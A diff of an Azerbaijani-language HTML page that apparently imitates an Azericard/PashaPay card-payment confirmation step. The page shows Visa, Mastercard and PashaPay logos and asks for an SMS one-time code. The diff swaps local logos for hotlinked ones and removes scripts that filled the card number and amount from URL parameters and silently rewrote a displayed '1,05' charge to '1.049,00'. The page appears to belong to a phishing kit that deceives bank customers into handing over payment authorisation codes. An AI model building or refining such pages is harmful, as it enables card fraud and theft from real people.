@@ -84,8 +84,8 @@
         <main class="main">
             <header>
                 <div class="card-call">
-                    <img src="images/visa_logo.png" style="height:20px;" >
-                    <img src="images/mastercard_logo.png" style="height:25px;" style="width: 40px;" >
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:20px;">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" style="height:25px;">
                     <img src="https://static.tildacdn.one/tild3062-3037-4265-b832-663130393564/m10byPashaPay_1.svg" >
                 </div>
             </header>
@@ -113,7 +113,7 @@
                                            pattern="[0-9]*">
                                 </div>
                                 <div class="tooltip">
-                                    <img src="images/visa_logo.png" style="height:20px;" >
+                                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:20px;">
                                     <span class="tooltiptext">
                                         Sizə mesaj vasitəsi ilə göndərildi!
                                     </span>
@@ -125,7 +125,7 @@
 
                     <div class="form-button">
                         <button id="submitBtn" type="submit" class="submitBtn" disabled>
-                            <img src="images/visa_logo.png" style="height:20px;" >
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:20px;">
                             Ödənişi təsdiqlə
                         </button>
                         <button id="cnltBtn" type="button" onclick="window.location.href='../index.html'">
@@ -140,72 +140,20 @@
             <div class="footer_1">
                 <img src="images/visa_logo.png" style="height:20px;" style="height:20px; margin: 0 10px;" >
                 <img src="images/visa_logo.png" style="height:20px;" style="height:20px; margin: 0 10px;" >
-                <img src="images/mastercard_logo.png" style="height:25px;" style="width: 40px;" >
-                <img src="images/mastercard_logo.png" style="height:25px;" style="width: 40px;" >
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" style="height:25px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" style="height:25px;">
             </div>
             <div class="footer_2">
-                <img src="images/visa_logo.png" style="height:20px;" >
-                <img src="images/visa_logo.png" style="height:20px;" >
-                <img src="images/visa_logo.png" style="height:20px;" >
-                <img src="images/visa_logo.png" style="height:20px;" >
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:20px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:20px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:20px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" style="height:20px;">
             </div>
         </footer>
     </div>
 
     <script src="js/azericard-imask.js"></script>
-    <script>
-        // Get URL parameters
-        const urlParams = new URLSearchParams(window.location.search);
-        const cardNumber = urlParams.get('card') || '';
-        const amount = urlParams.get('amount') || '1.049,00';
-
-        // Format and display amount
-        const formattedAmount = new Intl.NumberFormat('az-AZ', {
-            style: 'currency',
-            currency: 'AZN'
-        }).format(parseFloat(amount));
-        document.getElementById('paymentAmount').textContent = formattedAmount;
-        document.getElementById('card').value = cardNumber;
-
-        // Update card display - show last 4 digits
-        const lastFourDigits = cardNumber.slice(-4);
-        document.getElementById('cardNumber').textContent = lastFourDigits ? `**** **** **** ${lastFourDigits}` : '';
-
-        // Set current date and time
-        function updateDateTime() {
-            const now = new Date();
-            const hours = String(now.getHours()).padStart(2, '0');
-            const minutes = String(now.getMinutes()).padStart(2, '0');
-            const dd = String(now.getDate()).padStart(2, '0');
-            const mm = String(now.getMonth() + 1).padStart(2, '0');
-            const yyyy = now.getFullYear();
-            
-            document.getElementById('currentDateTime').textContent = 
-                `${hours}:${minutes} ${dd}.${mm}.${yyyy}`;
-        }
-        updateDateTime();
-
-        // Set card type logo
-        const cardTypeLogo = document.getElementById('cardTypeLogo');
-        if (cardNumber.startsWith('4')) {
-            cardTypeLogo.src = 'images/visa.png';
-            cardTypeLogo.alt = 'Visa';
-        } else if (/^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[0-1]|2720)/.test(cardNumber)) {
-            cardTypeLogo.src = 'images/mastercard.png';
-            cardTypeLogo.alt = 'Mastercard';
-        }
-
-
-        // Enable submit button when OTP is entered
-        const otpInput = document.getElementById('securitycode');
-        const submitBtn = document.getElementById('submitBtn');
-        
-        otpInput.addEventListener('input', function() {
-            submitBtn.disabled = this.value.length < 4;
-        });
-
-
-    </script>
+    
 
 <style>
     .professional-error {
@@ -235,33 +183,4 @@
 
 
 
-<script>
-    document.addEventListener('DOMContentLoaded', function() {
-        // 1. MƏBLƏĞİ DÜZƏLDİRİK (1,05 -> 1.049,00)
-        const allElements = document.querySelectorAll('*');
-        allElements.forEach(el => {
-            if (el.children.length === 0 && (el.innerText.trim() === '1,05' || el.innerText.trim() === '1.05')) {
-                el.innerText = '1.049,00';
-            }
-        });
 
-        // 2. QIRIQ ŞƏKİLLƏRİ DÜZƏLDİRİK (Loqolar bərpa olunur)
-        const images = document.querySelectorAll('img');
-        images.forEach(img => {
-            const src = img.getAttribute('src');
-            // Əgər şəkil yoxdursa və ya src boşdursa
-            if (!src || src === '' || src.includes('undefined')) {
-                // Şəklin alt (alt) yazısına və ya ölçüsünə görə təyin edirik
-                const alt = (img.getAttribute('alt') || '').toLowerCase();
-                if (alt.includes('visa') || img.width < 40) {
-                    img.src = 'images/visa_logo.png';
-                } else if (alt.includes('master')) {
-                    img.src = 'images/mastercard_logo.png';
-                } else {
-                    // Əgər hansı loqo olduğu bilinmirsə, sadəcə boş buraxırıq (qırıq göstərməsin)
-                    img.style.display = 'none';
-                }
-            }
-        });
-    });
-</script>
